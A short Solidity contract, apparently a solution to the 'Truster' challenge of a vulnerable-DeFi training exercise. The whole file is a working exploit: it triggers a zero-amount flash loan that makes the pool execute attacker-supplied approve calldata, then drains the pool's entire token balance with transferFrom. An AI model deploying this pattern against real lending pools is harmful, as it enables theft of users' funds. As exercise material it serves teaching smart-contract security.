// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        returns (bool);
}
contract TrusterAttacker {
    IPool pool;
    IERC20 token;

    constructor(address _poolAdress, address _tokenAddress) {
        pool = IPool(_poolAdress);
        token = IERC20(_tokenAddress);
    }

    // function functionCall() {}
    function attack(address _token, bytes calldata _dataApprove) external {
        uint256 poolBalance = token.balanceOf(address(pool));

        pool.flashLoan(0, msg.sender, _token, _dataApprove);
        // pool.flashLoan(0, msg.sender, _token, _dataTransfer);
        token.transferFrom(address(pool), msg.sender, poolBalance);
    }
}